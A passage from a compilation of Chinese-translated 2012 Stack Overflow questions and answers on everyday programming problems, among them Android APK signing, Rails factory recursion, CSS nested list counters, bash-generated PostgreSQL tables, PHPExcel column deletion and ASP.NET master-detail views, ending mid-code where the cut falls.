# android - 错误 Apk 必须使用相同的证书进行签名

> ID：13841767
> 
> 赞同：0
> 
> 时间：2012-12-12T14:18:03.857
> 
> 标签：android, certificate, apk

我的最后一个密钥一定已经过期，因为当我尝试上传一个新的 apk 时，我已经做了无数次，然后它才要求我加载一个新的。但是，当我这样做时，我会收到上面的消息。我使用相同的项目名称和相同的密钥代码文件，但即使我创建了大约六个新的 apk 文件，我仍然收到相同的消息。我尝试取消发布我的应用程序以创建一个新应用程序，但它只是告诉我我已经有一个同名的 apk！非常感谢任何帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:34:30.307

“包名”是应用程序的唯一标识符。如果要更新现有应用程序，则应使用与以前的 apk 相同的密钥对 apk 进行签名。

如果你想创建新的应用程序，你应该在 mainfest 文件中更改包名。这允许您发布使用另一个密钥签名的 0 次下载的新应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:36:23.027

您在同一软件包下上传的所有应用程序版本都必须使用相同的密钥进行签名，正如 Google 所说的那样[-](http://developer.android.com/tools/publishing/app-signing.html)证书过期后您无法更新您的应用程序。

> “如果您计划支持单个应用程序的升级，您应该确保您的密钥的有效期超过该应用程序的预期寿命。建议有效期为 25 年或更长。当您的密钥有效期到期时，用户将不再能够无缝升级到您的应用程序的新版本。”

# ruby-on-rails - Rspec 和 FactoryGirl：SystemStackError：堆栈级别太深

> ID：13841768
> 
> 赞同：3
> 
> 时间：2012-12-12T14:18:05.667
> 
> 标签：ruby-on-rails, rspec, factory-bot

我对 FactoryGirl 有疑问：

这是我的 2 家工厂：

```
FactoryGirl.define do
  factory :task do
    ...
    after(:build) do |task|
      question = FactoryGirl.create(:question)
      task.questions = [question]
    end
  end
end 
```

和

```
FactoryGirl.define do
  factory :question do
    association :task, factory: :task
    ...
  end
end 
```

问题工厂创建任务，任务工厂创建问题等。所以，我有一条消息：“SystemStackError：堆栈级别太深”。

如何在不破坏关联的情况下解决这个问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T14:39:54.323

您会收到“堆栈级别太深”错误，因为您正在根据彼此定义两个工厂。您不需要工厂`association :task, factory: task`中的线路`question`——关联将在您创建任务时设置。

`task`在你的工厂试试这个：

```
FactoryGirl.define do
  factory :task do
    ...
    questions { [ FactoryGirl.create(:question) ] }
  end
end 
```

# eclipse - 在 Eclipse 的可视化选项卡中看不到 primefaces 组件

> ID：13841769
> 
> 赞同：0
> 
> 时间：2012-12-12T14:18:05.847
> 
> 标签：eclipse, primefaces

我正在使用 Eclipse Indigo SR2 开发一个动态 Web 项目。我正在使用 Primefaces 3.4.2，并且在编辑 .xhtml 时，`Visual`视图无法正确显示组件。

![在此处输入图像描述](../Images/d13adc73bd47d6cdf981665e0c317827.png)

我正在使用 JBossTools 并部署到 JBoss 服务器；我尝试将 primefaces 库添加到 web-inf/lib 或作为用户库，但无济于事。

谷歌几乎没有找到这方面的结果，大多数问题都与自动完成功能有关（顺便说一句，它确实正确）。

有没有办法显示视觉组件？我不确定我是否期望过高，但在使用richfaces 组件时这是一个很好的功能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:32:11.380

没办法，使用真正的浏览器进行预览，因为 JSF 视图是即时热部署的。

# css - 有序列表 CSS 样式包括父编号

> ID：13841771
> 
> 赞同：5
> 
> 时间：2012-12-12T14:18:08.753
> 
> 标签：css, html-lists, nested

我们希望使用 CSS 创建一个有序列表，如下所示：

```
A.
A.1
A.2
B.
C.
C.1
C.2
C.2.1
C.2.2 
```

你会如何像这样在孩子中包含父索引？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T14:20:34.053

您需要使用[CSS 计数器](https://developer.mozilla.org/en-US/docs/counters)。

### 示例（[来自 MDN](https://developer.mozilla.org/en-US/docs/counters)）

CSS：

```
ol {
  counter-reset: section;                /* Creates a new instance of the
                                            section counter with each ol
                                            element */
  list-style-type: none;
}
li:before {
  counter-increment: section;            /* Increments only this instance
                                            of the section counter */
  content: counters(section, ".") " ";   /* Adds the value of all instances
                                            of the section counter separated
                                            by a ".". */
} 
```

HTML：

```
<ol>
 <li>Entry
 <li>Entry
 <li>Entry with subentries
  <ol>
    <li>Entry
    <li>Entry
    <li>Entry
    <li>Entry
  </ol>
 <li>Entry
 <li>Entry
 <li>Entry with subentries
  <ol>
    <li>Entry
    <li>Entry
    <li>Entry
    <li>Entry
  </ol>
</ol> 
```

[JSFiddle](http://jsfiddle.net/8MWdL/1/)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-12T15:06:29.797

您应该使用[^(W3C 规范)](http://dev.w3.org/csswg/css3-lists/#counter-set)（*如**[@Zeta](https://stackoverflow.com/a/13841818/128165)*）指出的[CSS 计数器，但这里有一种方法可以处理多个嵌套和拉丁计数器..](http://dev.w3.org/csswg/css3-lists/#counter-set)

```
ol{
    list-style: none;
}
ol.roman{
    counter-reset: roman;
}
ol.roman > li:before{
    counter-increment: roman;
    content: counter(roman, upper-latin)".";
    padding-right:5px;
}
ol.roman li ol{
    counter-reset: inner;
}
ol.roman ol li:before{
    counter-increment: inner;
    content: counter(roman, upper-latin)"."counters(inner,'.');
    padding-right:5px;
} 
```

演示在[http://jsfiddle.net/gaby/nZQSF/](http://jsfiddle.net/gaby/nZQSF/)

# shell - 如何在postgresql中使用for循环创建多个表

> ID：13841773
> 
> 赞同：2
> 
> 时间：2012-12-12T14:18:12.827
> 
> 标签：shell, psql

如何`for`在 postgresql 中使用循环创建多个表？

例如：我需要创建 c_emloyee、r_employee、i_employee 等。在 FOR 附近出现语法错误

```
! /bin/sh

#Invoke postgre
 SQLVARCHAR="varchar"
 SQLINTEGER="integer"
 SQLBIGINT="bigint"
 SQLSMALLINT="smallint"
 SQLTINYINT="smallint"
 SQLCIDR="cidr"
 SQLBINARY="varbinary"
 SQLTIME="timestamp"
 SQLMACADDRESS="macaddr"
 prefix[0]=c_
 prefix[1]=r_
 prefix[2]=s_
 prefix[3]=i_
 echo ${prefix[0]}
 echo ${prefix[1]}
 echo ${prefix[2]}
 echo ${prefix[3]}

 psql -d postgres <<EOF
 BEGIN 
 FOR i IN 0 1 2 3 LOOP 
 create table ${prefix[i]}employee (e_name $SQLVARCHAR(32) primary key, type $SQLTINYINT not null, description $SQLVARCHAR(128), ip_address $SQLCIDR);
 END LOOP;
 END; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T23:40:17.487

你犯了两个错误：

*   `FOR`, `BEGIN ... END`, 等是 PL/PgSQL 的一部分，而不是常规 SQL。您不能在普通 SQL 中使用这些，您需要一个`DO`块或`CREATE OR REPLACE FUNCTION`.

*   您对评估的顺序感到非常困惑。您已经编写了一个 PL/PgSQL`FOR`循环`i`，然后`i`在*bash*变量扩展中引用。这将在 PL/PgSQL 函数文本的生成过程中被扩展，远在变量`i`存在之前。

如果您只是替换为，则可以清楚地看到后一个问题`psql -d postgres`，`cat`因此它会打印您尝试运行的生成的 SQL：

```
BEGIN
 FOR i IN 0 1 2 3 LOOP
 create table c_employee (e_name varchar(32) primary key, type smallint not null, description varchar(128), ip_address cidr);
 END LOOP;
 END; 
```

如您所见，`${prefix[i]}`评估为`c_`因为`i`未定义，bash 将其视为零。`prefix`因此，您的数组中的其他条目将永远不会被使用。

你需要：

*   使用`DO`块或`CREATE OR REPLACE FUNCTION`函数调用来执行您的 PL/PgSQL 代码；和

*   用于`EXECUTE format(...)`运行动态 SQL

或者，您可以在 for 循环中生成纯 SQL`CREATE TABLE`语句，`bash`完全不需要 PL/PgSQL。我会使用这种方法，因为它更简单。

```
for p in ${prefix[*]}; do
  echo "create table ${p}employee (e_name $SQLVARCHAR(32) primary key, type $SQLTINYINT not null, description $SQLVARCHAR(128), ip_address $SQLCIDR);"
done | psql 
```

顺便说一句，没有这样的东西`postgre`。我认为您的意思是“Postgres”或“PostgreSQL”。

你可能`bytea`不想`varbinary`。无论如何，作为变量的 SQL 类型有什么用？您是否正在尝试编写 DDL 生成系统？如果是这样，不要重新发明那个轮子，那里已经有很多了。

此外，如果您正在做这样的事情，那么您很有可能需要阅读模式（如果您尝试进行多租户）、表分区等。

# php - 使用while循环对数组中的变量求和每次刷新PHP SQL仅1次迭代

> ID：13841775
> 
> 赞同：1
> 
> 时间：2012-12-12T14:18:15.893
> 
> 标签：php, arrays, variables, while-loop, sum

你好***stackoverflow***，很长一段时间的潜伏者第一次提问。无论如何，我正在为我的学校创建一个项目，它几乎已经完成，但我认为我需要 while 循环的帮助。我正在尝试对存储在数组中的变量求和，然后将其输出到一个可用的变量中，我可以与另一个变量求和。问题是每次我刷新到页面时循环只进行 1 次迭代。所以它最终会得到完整的数组，但一次只能得到一个项目。请让我知道我出了什么问题，我确定它是愚蠢的！

```
$bill= mysql_query("SELECT Transaction.date, Transaction.Price, Transaction.customer_customer_id, Service.cost, Service.user_id, Service.uname
FROM *.Transaction,*.Service
WHERE Transaction.customer_customer_id = Service.user_id AND Service.uname = '$uuname'");
$query_row=mysql_fetch_array($bill);
$userservice = ($query_row[cost]);
$userprice = ($query_row[Price]);

$row2=array();
while($row = mysql_fetch_array($bill))
{

    $row2[] += $row['cost'];

}
$totalservice = array_sum($row2); 
```

感谢你们可能有的任何帮助。这个在炸我的大脑。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:01:52.123

您的 SQL 和 PHP 都没有任何意义。

```
FROM *.Transaction,*.Service 
```

...将在 MySQL 中引发错误，但您的代码不会检查错误。我怀疑应该是：

```
FROM Transaction, Service 
```

虽然 PHP 将解析并运行......

```
while($row = mysql_fetch_array($bill)) {
   $row2[] += $row['cost'];
}
$totalservice = array_sum($row2); 
```

是一种非常奇怪的填充数组的方式。为什么不只是......

```
while($row = mysql_fetch_array($bill)) {
   $totalservice+=$row['cost'];
} 
```

确实，如果您只是丢弃其余数据，那么您为什么要从数据库中获取它呢？

```
SELECT SUM(Service.cost)
FROM Transaction,Service
WHERE Transaction.customer_customer_id = Service.user_id 
AND Service.uname = '$uuname' 
```

在这种情况下，连接也是多余的：

```
SELECT SUM(Service.cost)
FROM Service
WHERE Service.uname = '$uuname' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:27:30.617

*问题是每次我刷新到页面时循环只进行 1 次迭代。* 您是否对数据库运行过查询并检查它是否返回多行？

此外，如果您只想对成本列求和，您可以在 sql 中执行此操作： `SELECT SUM(cost)[....]`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:30:27.540

将查询重写为

SELECT Service.user_id, Service.uname, SUM(Service.cost) as cost FROM djqrico_hotel.Transaction LEFT JOIN djqrico_hotel.Service ON Transaction.customer_customer_id = Service.user_id WHERE Service.uname = '$uuname' GROUP BY Service.user_id

如果您想获得所有用户交易的总和。

# localization - 如何为 MailChimp 列表订阅插件启用其他语言？

> ID：13841777
> 
> 赞同：1
> 
> 时间：2012-12-12T14:18:23.730
> 
> 标签：localization, internationalization, wordpress, mailchimp

我已经为 wordpress翻译了 MailChimp 提供的[**MailChimp 列表订阅表单插件。**](http://wordpress.org/extend/plugins/mailchimp/)

我使用 poEdit 进行编辑。在`wp-config.php`我将语言设置为`ar_SA`. 这适用于我在两个双语网站中使用的主题。但是必须将 mo 文件重命名为`ar.mo`

我有两个问题：

1.  更新目录时 poEdit 崩溃。但我可以保存`.po` 并`.mo`成功生成。

2.  `.mo`通过它应该的 Ajax 调用确认成功或错误消息不会出现翻译。

我在`.po`这里提交我的文件链接供专家查看。我已将翻译设置保存在文件中。

[翻译 Bangla.po 文件](https://github.com/zenideas/wp-mailchimp/blob/develop/po/mailchimp_i18n-bn_BD.po) || [翻译阿拉伯语.po 文件](https://github.com/zenideas/wp-mailchimp/blob/develop/po/mailchimp_i18n-ar_SA.po)

# jquery - jQuery 实时计算 position()

> ID：13841784
> 
> 赞同：0
> 
> 时间：2012-12-12T14:18:48.817
> 
> 标签：jquery, position

我正在尝试为页面中的用户照片（img）添加内部阴影。除非动态添加用户照片元素或从其位置移动，否则它可以正常工作。无论如何，当元素移动时，是否可以计算实时位置或重新计算位置。

```
jQuery('.UserPhoto').each(function(){

    var photo = jQuery(this);
    var photowidth = photo.width();
    var photoheight = photo.height();
    var photoposition = photo.position();
    var shadowcss = {
            'position' : 'absolute',
            'top' : photoposition.top + 'px',
            'left' : photoposition.left + 'px',
            'height' : photoheight + 'px',
            'width' : photowidth + 'px'
        }
    jQuery(this).after("<div class='userPhotoShadow'></div>");
    jQuery(this).next().css(shadowcss);

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:02:38.243

首先，我认为附加阴影元素的效率非常低，并且在移动照片时必须处理其位置。

另一种方法（更好的 imo）是在你的照片周围包裹一个元素，然后在其中附加你的阴影，如下所示：

```
$('.UserPhoto').each(function () {
    $(this).wrap('<div class="UserPhotoWrapper" />')
        .parent()
        .append('<div class="UserPhotoShadow" />');
}); 
```

这是一个[小提琴](http://jsfiddle.net/ZeeAR/)，可以向您展示我在说什么。希望有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:41:29.280

第一部分很简单。连接以移动/调整事件大小并在那里更新您的阴影元素。

第二部分可能很棘手。有 DOMSubtreeModified/DOMNodeInserted/等。事件，但它们并没有被各种浏览器很好地支持。创建新照片后，手动调用阴影创建代码要容易得多。

最后一部分是你如何判断照片是否已经有阴影。理想情况下您不必这样做，但是如果您批量添加照片并且没有真正准备好选择新照片，那么您上面的代码可以简单地`has-shadow`向它已经处理的照片添加一个标记类并忽略那些已经处理过的照片有它。

* * *

除了使用移动/调整大小事件之外，您还可以简单地将阴影 div 添加到照片 div 中（而不是在它之后）。只要您不设置`overflow:hidden`它就可以使用基本的 CSS 并且不涉及任何 javascript。

您也可以尝试使用 CSS 伪元素`:before`，`:after`而不是通过 javascript 添加元素。取决于你的影子到底是什么样子，这可能会或可能不会起作用，但它比尝试通过 javascript 来实现更清洁、更高效。

# php - 哪个选项更有效（使用 PDO 的数据库查询）

> ID：13841788
> 
> 赞同：0
> 
> 时间：2012-12-12T14:18:57.453
> 
> 标签：php, database, pdo

我正在构建一个类来处理数据库操作，我决定使用 PDO。

起初我决定使用静态方法来简化调用，因为属性不改变，方法是独立的，所以我不需要保存对象的引用。但是，使用此解决方案，我必须为此类类的某些方法的每次调用实例化一个新的 PDO 对象，连接到数据库，然后准备查询并执行。

Bellow 是此类的插入方法的基础示例：

```
public static function insert($table, $columns, $values){
    $dbConnection = new PDO('mysql:dbname='.self::$db.'; host='.self::$host.'; charset=utf8', self::$login, self::$pass);

    ... create the sql query and the associative array of values

    $stmt = $dbConnection->prepare($sql);
    $stmt->execute($array_aux);
} 
```

所以我想知道在每次调用中实例化 PDO 对象是否效率太低，如果我最好存储 PDO 引用，那么不要使用静态方法。

ps：我知道有些人讨厌静态方法，因为它们很难进行单元测试，但在某些情况下它们非常方便。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:59:31.263

举一个@nikita2206建议的例子：

```
private $pdo = null;
private static function getDB(){
    if(is_null(self::$pdo)) self::$pdo = new PDO(...);
    return self::$pdo;
}
public static function insert($table, $columns, $values){
     $dbConnection  = self::getDB();
     ....
} 
```

请注意：您的代码，使用像这样的静态方法和变量完全无法使用 mock-pdo 对象进行测试......此时它们并不比全局变量好多少，依赖注入将是首选。

# java - Java中的通用接口

> ID：13841789
> 
> 赞同：2
> 
> 时间：2012-12-12T14:18:58.000
> 
> 标签：java, generics, interface

我有以下接口

```
public interface Group {
    public Group add(Group g);
    public Group sub(Group g);
    public Group getAddInv();
    public boolean isZero();
}

public interface Ring extends Group {
    public Ring mul(Ring r);
    public boolean isOne();
} 
```

我现在想让这些接口通用，以确保只能为相同代数结构的元素调用方法。

例如，应该可以添加两个环元素，但不能添加一个群元素和一个环元素。

我的第一个想法是使用 < ? super Ring > 用于 Group 的方法，但这并没有成功。我怎样才能做到这一点？

更新：

```
public interface Group<T> {
    public T add(T g);
    public T sub(T g);
    public T getAddInv();
    public boolean isZero();
}

public interface Ring<T> extends Group<Ring<T>> {
    public T mul(T r);
    public boolean isOne();
} 
```

那会是一个解决方案吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T21:22:06.003

它应该是这样的：

```
public interface Group<T> {
    public T add(T g);
    public T sub(T g);
    public T getAddInv();
    public boolean isZero();
}

public interface Ring<T> extends Group<T> {
    public T mul(T r);
    public boolean isOne();
} 
```

实际的实现将使用它们自己的类型参数来实现这些接口：

```
class MyInteger implements Ring<MyInteger> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:30:19.193

也许你想使用这样的接口：

```
public interface Test<T> {
    public void add(T t);
} 
```

然后如果你愿意，你可以在你的函数中使用 instanceof 吗？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T14:36:21.683

我不会尝试通过类型系统来做到这一点。首先，正如一些评论已经提到的那样，界面看起来很奇怪（将一个组添加到另一个组是什么意思？）。相反，我会专注于通常在一个小组上做的事情，这会像这样

```
interface Group<T>{
  T add(T e1, T e2);  //adds two elements of the group and returns the result
  //sub is not a group operation, there is normally only one op
  ...
} 
```

Ring 也一样，只是增加了`mul()`操作。

如果你想强制只有包含在组/环中的元素可以在操作中使用，你的实现应该检查参数是否在组/环中，如果不是则抛出异常。类型系统*不是*为此而设计的，因为这是基于值的检查，而不是类型检查。

# php - phpexcel删除一列或多列

> ID：13841792
> 
> 赞同：2
> 
> 时间：2012-12-12T14:19:03.023
> 
> 标签：php, phpexcel

我想一次删除一列而不删除列的右侧。我已经浏览了第一行，如果它是空白的，我只想删除该列。但该功能只允许我删除列和它旁边的列。y场景列（M有值）（N无值）（O无值）（P有值）（Q有值）

```
$toremove_arr=array();
for ($ga='A'; $ga !== $highestCol; $ga++){
    $col=$objPHPExcel->getActiveSheet()->getCell($ga.'1')->getValue();
    if ($col=='') {
        $toremove_arr[]=$ga;
    }
}
$toremove_num  = count($toremove_arr);
for($i=0; $i < $toremove_num; $i++){
    $objPHPExcel->getActiveSheet()->removeColumn($toremove_arr[$i], 1);
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T23:19:01.800

当您删除一列时，例如 A 列，PHPExcel 不会简单地清空 A 列中的所有单元格，而是将所有其他列打乱以填补空白......因此 B 列成为新的 A 列，C 列变为新列 B 等。这模拟了 MS Excel 的行为。

如果要删除的列数组包含 A 和 B：首先删除 A 列。之前的 B 列现在变成 A 列，之前的 C 列变成 B 列，之前的 D 列变成新的 C 列。然后你删除 B 列......但是你实际上是之前在列中的数据C...不是您计划删除的列...您确实打算从现在是 A 列的列中删除数据。

要解决此问题，您需要以相反的顺序删除列；所以你先删除B列，然后再删除A列。

```
array_reverse($toremove_arr);
$toremove_num = count($toremove_arr);
for($i=0; $i < $toremove_num; $i++){
    $objPHPExcel->getActiveSheet()->removeColumn($toremove_arr[$i], 1);
} 
```

# macos - 为什么此按钮在 Mac 上的 Firefox 中不起作用？

> ID：13841796
> 
> 赞同：0
> 
> 时间：2012-12-12T14:19:12.403
> 
> 标签：macos, firefox

我希望有人能告诉我是什么原因导致 Mac 上的 Firefox 上的“继续”按钮失败。这是一个简单的表格，带有一个选择国家的按钮。我与一家非营利组织合作，试图为年终捐赠筹集资金以帮助拯救动物，这个页面适用于“大多数”浏览器：Windows FF、IE、旧版 IE、Chrome 以及 Mac Safari 和 Chrome。但是，它似乎在 Mac 上的 FF 上完全失败，我不知道为什么。

代码都在页面中：www.ifaw.org/united-states/holiday-gift

我猜问题是 Mac 中的 FF 没有运行 onclick="selectTheRightCountry();" 常规。但是 Javascript 已打开，所以我不确定它为什么不起作用。

恐怕我的大部分网页设计都是基于 Windows 的，而且我不是跨浏览器 Javascript 的专家，所以我不确定解决这个问题的最佳方法是什么。

感谢您的任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T19:38:22.850

这似乎仅限于 Mac 上旧版本的 Firefox。如果有人知道的话，仍然会很想知道是什么原因造成的，但这不再是什么大不了的事情了。谢谢！

# iphone - if 语句在 els 上推送到 viewController 不起作用

> ID：13841804
> 
> 赞同：0
> 
> 时间：2012-12-12T14:19:50.107
> 
> 标签：iphone, objective-c, ios, if-statement

我在这里做了一个 if 语句，如果文本字段包含少于 4 个符号，它会弹出一个窗口。如果文本字段包含超过 4 个，它应该推送到不同的视图控制器。

由于某种原因，推送不起作用。弹出窗口工作正常。

基本上我们现在使用的视图控制器是“首次启动设置页面”，所以我不希望用户导航回它。我怎样才能做到这一点？

这是我的代码：

```
-(IBAction)initialButton:(id)sender {
    NSLog(@"initialButton clicked");

     if([userEmail.text length] <4)
     {
         [WCAlertView showAlertWithTitle:@"Email is empty" message:@"You haven't entered an email yet. Please enter one so we can /sent you the shipping labels."     customizationBlock:^(WCAlertView *alertView) {
             alertView.style = WCAlertViewStyleBlackHatched;
         } completionBlock:^(NSUInteger buttonIndex, WCAlertView *alertView) {
             if (buttonIndex == 0) {
                 NSLog(@"Cancel");
             } else {
                 NSLog(@"Ok");
             }
         } cancelButtonTitle:@"Cancel" otherButtonTitles:@"Ok", nil];
     }
     else {
              ViewController *viewController = [[ViewController alloc] init];
              [self.navigationController pushViewController:viewController animated:YES];
     }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:01:55.607

您的视图控制器是否嵌入在导航控制器中？（如果没有`self.navigationController`的话`nil`）

如果不是，您需要使用视图控制器初始化 UINavigationController。

```
UINavigationController *navCon = [UINavigationController alloc] initWithRootViewController:yourViewController]; 
```

然后将其设置为您窗口的 rootViewController。

# javascript - 无法在开发服务器下的 javascript 运行站点中加载 xml 文件

> ID：13841808
> 
> 赞同：3
> 
> 时间：2012-12-12T14:20:00.263
> 
> 标签：javascript, asp.net, aspnet-development-server

在 VS 开发服务器下运行站点时，我无法在 javascript 中加载 xml 文件（使用与[此处相同的代码）。](https://stackoverflow.com/questions/11527238/load-xml-file-in-a-directory-using-javascript)它在 IIS 下运行时有效。我知道 IIS 默认情况下会在未经授权的情况下显示静态内容，而 DevServer 则不会。我尝试将文件放在 web 应用程序项目（自定义公共目录、App_Data、根目录）下的不同位置，但没有成功。

错误被 global.asax 中的 Application_Error 方法捕获，它说

```
"System.Web.HttpException (0x80004005): Path 'foo.xml' is forbidden." 
```

但是，ajax 调用不会崩溃，并且当使用不同的代码（jQuery.ajax() 方法）完成时，ajax 调用总是成功的，并且永远不会进入我提供的错误回调。

该脚本是从 aspx 页面上的脚本块调用的。

# c++ - msgpack：将类打包到成员函数中

> ID：13841809
> 
> 赞同：0
> 
> 时间：2012-12-12T14:20:01.720
> 
> 标签：c++, msgpack

我对“msgpack”很陌生。我正在尝试打包用户定义的类：

```
MyClass::Pack()
{
    msgpack::sbuffer sbuf;
    msgpack::pack(sbuf, this);
} 
```

但是编译器（VC 9.0）说我

```
error C2228: left of '.msgpack_pack' must have class/struct/union third_party\msgpack\include\msgpack\object.hpp 218 
```

我发现的唯一方法：

```
MyClass::Pack()
{
    MyClass copy(this);
    msgpack::sbuffer sbuf;
    msgpack::pack(sbuf, copy);
} 
```

但是，如果我不想制作副本（例如，操作繁重或需要许多额外资源）怎么办？我可以在没有复印机的情况下做到这一点吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:30:10.130

调用`msgpack::pack(sbuf, this);`可能是`msgpack::pack(sbuf, *this);`获取一个对象（`this`只是一个指针）......我不确定这`MyClass copy(this);`是调用一个正确的复制构造函数......也许我错了，我还没有使用 msgpack，我只看到 C++ :(

# c# - 在gridview中选择行并在detailsview中显示

> ID：13841810
> 
> 赞同：0
> 
> 时间：2012-12-12T14:20:06.020
> 
> 标签：c#, asp.net, gridview, detailsview

我有一个带有选择链接的网格视图。据说，当我单击选择链接时，应该出现 DataKeyNames 的特定详细信息。

但是，就我而言，每当我单击“选择”时，只会出现一条记录，并且它不会更改并与所选 DataKeyNames 的数据匹配。我已经阅读了网上的许多示例，并且我做的完全一样，但是它不能正常工作。。

```
<asp:SqlDataSource ID="SqlDataSource1" runat="server" 
    ConnectionString="<%$ ConnectionStrings:WholesaleConnectionString %>" 
    SelectCommand="SELECT [poNum], [retailerID] FROM [PO]"></asp:SqlDataSource>

<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
    DataKeyNames="poNum" DataSourceID="SqlDataSource1" >
    <Columns>
        <asp:CommandField ShowSelectButton="True" />
        <asp:BoundField DataField="poNum" HeaderText="poNum" InsertVisible="False" 
            ReadOnly="True" SortExpression="poNum" />
        <asp:BoundField DataField="retailerID" HeaderText="retailerID" 
            SortExpression="retailerID" />
    </Columns>
</asp:GridView>

<asp:SqlDataSource ID="SqlDataSource2" runat="server" 
    ConnectionString="<%$ ConnectionStrings:WholesaleConnectionString %>" 
    SelectCommand="SELECT [poNum], [quantity], [unitPrice], [totalAmt], [grandTotal] FROM [PO]">

    <SelectParameters>
    <asp:ControlParameter Name="poNum" ControlID="GridView1" PropertyName="SelectedValue" Type="Int32" />
    </SelectParameters>
   </asp:SqlDataSource>

<asp:DetailsView ID="DetailsView1" runat="server" DataSourceID="SqlDataSource2" 
    Height="50px" Width="125px">
</asp:DetailsView> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-01T05:42:51.937

DetailsView 控件也经常用在主-详细信息场景中，其中主控件的选定记录决定了要在详细视图中显示的记录。下面的 ASP.NET 程序展示了如何使用 GridView 和 DetailsView 控件显示来自数据库的主从数据。在这里，我们将主数据用作销售数据，将明细用作商店数据。当用户选择一行销售数据时，它将在 DetailsView 中显示相应的商店详细信息。

例如：

**默认.aspx**

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
<title>Untitled Page</title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <br /><b><u>Sales Details</u></b><br /><br />
        <asp:GridView ID="GridView1" runat="server" DataSourceID="SqlDataSource1"
        DataKeyNames="stor_id" AutoGenerateSelectButton="true"  AllowPaging="True" pagesize ="5"  />
        <br /><b><u>Store Details</u></b><br /><br />
        <asp:DetailsView id="DetailsView1" DataSourceID="SqlDataSource2"
        DataKeyNames="stor_id" AllowPaging ="true" Runat="server" />
        <asp:SqlDataSource ID="SqlDataSource1" runat="server"
        ConnectionString="<%$ ConnectionStrings:SQLDbConnection %>"
        SelectCommand="select * from sales" />
        <asp:SqlDataSource ID="SqlDataSource2" runat="server"
        ConnectionString="<%$ ConnectionStrings:SQLDbConnection %>"
        SelectCommand="select * from stores WHERE stor_id=@stor_id" >
        <SelectParameters>
           <asp:ControlParameter Name="stor_id" ControlID="GridView1" />
        </SelectParameters>
        </asp:SqlDataSource>
    </div>
    </form>
</body>
</html> 
```

# php - 使用 GET 表单向 URL 添加额外参数

> ID：13841811
> 
> 赞同：1
> 
> 时间：2012-12-12T14:20:12.760
> 
> 标签：php, javascript, forms, parameters, get

我使用带有 GET 方法的表单将参数添加到我的 url。但是我有一个问题。

我使用不同的形式在 URL 中放置不同的参数。但是当我选择第一个，它在 URL 中，然后我选择另一个，第一个消失了。

我该如何解决这个问题？

```
<form action="" method="GET">
<select name="course" data-placeholder="Kies een vak..." class="chzn-select" tabindex="2" onchange="this.form.submit();">
                                  <option value=""></option> 
                                  <option value="0">Alles</option> 
                                  <option value="1">Markten & Prijzen</option> 
                                  <option value="2">Wiskunde</option> 
                                  <option value="3">Marketing</option> 
</select>   
</form>

<form action="" method="GET">
<select name="price" data-placeholder="Prijscategorie..." class="chzn-select" tabindex="2" onchange="this.form.submit();">
                                  <option value=""></option> 
                                  <option value="0">Alles</option> 
                                  <option value="2">< 2 euro</option> 
                                  <option value="4">< 4 euro</option> 
                                  <option value="6">< 6 euro</option> 
                                  <option value="8">< 8 euro</option> 
                                  <option value="10">< 10 euro</option> 
</select>   
</form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:29:46.687

您可以组合表单并将 onchange 替换为提交按钮：

```
<form action="" method="GET">
    <select name="course" data-placeholder="Kies een vak..." class="chzn-select" tabindex="2">
        <option value=""></option>
        <option value="0">Alles</option>
        <option value="1">Markten & Prijzen</option>
        <option value="2">Wiskunde</option>
        <option value="3">Marketing</option>
    </select>
    <select name="price" data-placeholder="Prijscategorie..." class="chzn-select" tabindex="2">
        <option value=""></option>
        <option value="0">Alles</option>
        <option value="2">< 2 euro</option>
        <option value="4">< 4 euro</option>
        <option value="6">< 6 euro</option>
        <option value="8">< 8 euro</option>
        <option value="10">< 10 euro</option>
    </select>
    <input type="submit" value="submit">
</form> 
```

如果你想要 onchange 你可以这样做：

```
<form action="" method="GET">
    <select name="course" data-placeholder="Kies een vak..." class="chzn-select" tabindex="2" onchange="this.form.submit();">
        <option value=""></option>
        <option value="0" <?php if($_GET[course] == '0'){ echo 'selected="selected"'; }?>>Alles</option>
        <option value="1" <?php if($_GET[course] == '1'){ echo 'selected="selected"'; }?>>Markten & Prijzen</option>
        <option value="2" <?php if($_GET[course] == '2'){ echo 'selected="selected"'; }?>>Wiskunde</option>
        <option value="3" <?php if($_GET[course] == '3'){ echo 'selected="selected"'; }?>>Marketing</option>
    </select>
    <select name="price" data-placeholder="Prijscategorie..." class="chzn-select" tabindex="2" onchange="this.form.submit();">
        <option value=""></option>
        <option value="0" <?php if($_GET[price] == '0'){ echo 'selected="selected"'; }?>>Alles</option>
        <option value="2" <?php if($_GET[price] == '2'){ echo 'selected="selected"'; }?>>< 2 euro</option>
